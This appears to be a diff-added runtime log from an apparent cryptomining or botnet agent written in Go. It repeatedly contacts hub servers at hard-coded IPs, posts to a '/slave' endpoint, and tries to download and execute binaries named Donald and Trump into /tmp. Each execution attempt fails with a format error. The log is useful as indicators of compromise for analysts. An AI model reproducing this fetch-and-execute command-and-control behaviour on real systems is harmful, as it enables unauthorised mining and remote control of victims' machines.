+I0615 12:44:11.695914   17737 report.go:46] empty baselist
+I0615 12:44:11.702012   17737 main.go:119] Post http://103.219.112.66:8000/slave: dial tcp 103.219.112.66:8000: connect: connection refused: 103.219.112.66:8000
+I0615 12:44:11.702166   17737 report.go:46] empty baselist
+I0615 12:44:11.747152   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:11.747448   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.762672   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.764828   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.766753   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.769721   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.771747   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.885862   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:44:11.894911   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:44:11.956044   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:44:12.015148   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:44:21.693187   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:44:21.693264   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:44:21.693337   17737 report.go:46] empty baselist
+I0615 12:44:21.734403   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:21.734491   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:21.736862   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:21.738591   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:21.740204   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:21.742047   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:21.743532   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.693266   17737 report.go:46] empty baselist
+I0615 12:44:31.733617   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:31.734189   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.737320   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.741308   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.743808   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.745848   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:31.747777   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.693220   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:44:41.694207   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:44:41.695158   17737 report.go:46] empty baselist
+I0615 12:44:41.740528   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:41.741347   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.743721   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.745911   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.747941   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.749663   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:41.751936   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.693280   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:44:51.693386   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:44:51.693488   17737 report.go:46] empty baselist
+I0615 12:44:51.729597   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:51.729968   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.732933   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.735032   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.736988   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.738887   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:51.741759   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.693364   17737 report.go:46] empty baselist
+I0615 12:45:01.731932   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:01.732276   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.734863   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.737168   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.738959   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.740839   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:01.743517   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.693291   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:45:11.693389   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:45:11.693428   17737 report.go:46] empty baselist
+I0615 12:45:11.922598   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:11.922692   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.925268   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.927750   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.929753   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.931829   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:11.936782   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.693222   17737 report.go:46] empty baselist
+I0615 12:45:21.731761   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:21.733771   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.738928   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.742569   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.745079   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.747843   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:21.750062   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.693277   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:45:31.693370   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:45:31.693472   17737 report.go:46] empty baselist
+I0615 12:45:31.736055   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:31.738070   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.741609   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.744168   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.746279   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.748730   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:31.750900   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.694664   17737 report.go:46] empty baselist
+I0615 12:45:41.766161   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:41.766834   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.769153   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.771254   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.773157   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.776595   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:41.778376   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.693857   17737 report.go:46] empty baselist
+I0615 12:45:51.727878   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:45:51.727970   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.733234   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.744056   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.745776   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.747576   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:45:51.749350   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.693213   17737 report.go:46] empty baselist
+I0615 12:46:01.727473   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:01.727878   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.731651   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.739368   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.741873   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.745449   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:01.747651   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.693149   17737 report.go:46] empty baselist
+I0615 12:46:11.726346   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:11.726433   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.731973   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.733727   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.735331   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.737146   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:11.739083   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.693268   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:46:21.693373   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:46:21.693415   17737 report.go:46] empty baselist
+I0615 12:46:21.920858   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:21.920935   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.923117   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.924628   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.925935   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.927554   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:21.929000   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.693407   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:46:31.693860   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:46:31.694184   17737 report.go:46] empty baselist
+I0615 12:46:31.928888   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:31.928964   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.931346   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.933541   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.935923   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.938321   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:31.944234   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.693149   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:46:41.694027   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:46:41.694342   17737 report.go:46] empty baselist
+I0615 12:46:41.923476   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:41.924089   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.927421   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.929901   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.932384   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.935070   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:41.937578   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:51.693209   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:46:51.694203   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:46:51.694512   17737 report.go:46] empty baselist
+I0615 12:46:52.160319   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:46:52.161012   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:52.163846   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:52.165810   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:52.167458   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:52.169435   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:46:52.171415   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.698333   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:47:01.698428   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:47:01.698461   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:47:01.698504   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:47:01.698540   17737 report.go:46] empty baselist
+I0615 12:47:01.932575   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:01.932651   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.934834   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.936468   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.937996   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.939425   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:01.940678   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:11.698818   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:47:11.699735   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:47:11.700045   17737 report.go:46] empty baselist
+I0615 12:47:11.833170   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:47:11.843752   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:47:11.919078   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:47:11.967927   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:47:12.486063   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:12.486742   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:12.491162   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:12.493987   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:12.497422   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:12.504591   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:12.510048   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.693150   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:47:21.693243   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:47:21.693283   17737 report.go:46] empty baselist
+I0615 12:47:21.926083   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:21.926160   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.928867   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.930657   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.932016   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.933718   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:21.935355   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.693339   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:47:31.693429   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:47:31.693468   17737 report.go:46] empty baselist
+I0615 12:47:31.932138   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:31.933138   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.936664   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.939576   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.941909   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.948279   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:31.954968   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.693244   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:47:41.694213   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:47:41.694520   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:47:41.695013   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:47:41.695218   17737 report.go:46] empty baselist
+I0615 12:47:41.930778   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:41.931598   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.939740   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.947885   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.955176   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.958048   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:41.960510   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.693385   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:47:51.693468   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:47:51.693570   17737 report.go:46] empty baselist
+I0615 12:47:51.771200   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:47:51.771300   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.793056   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.795689   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.797685   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.799466   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:47:51.801350   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.693186   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:48:01.693289   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:48:01.693323   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:48:01.693353   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:48:01.693390   17737 report.go:46] empty baselist
+I0615 12:48:01.935278   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:01.936238   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.942177   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.945084   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.948942   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.952748   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:01.954794   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:11.693321   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:48:11.693418   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:48:11.693450   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:48:11.693480   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:48:11.693516   17737 report.go:46] empty baselist
+I0615 12:48:11.926355   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:11.927039   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:11.930354   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:11.932585   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:11.934939   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:11.937697   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
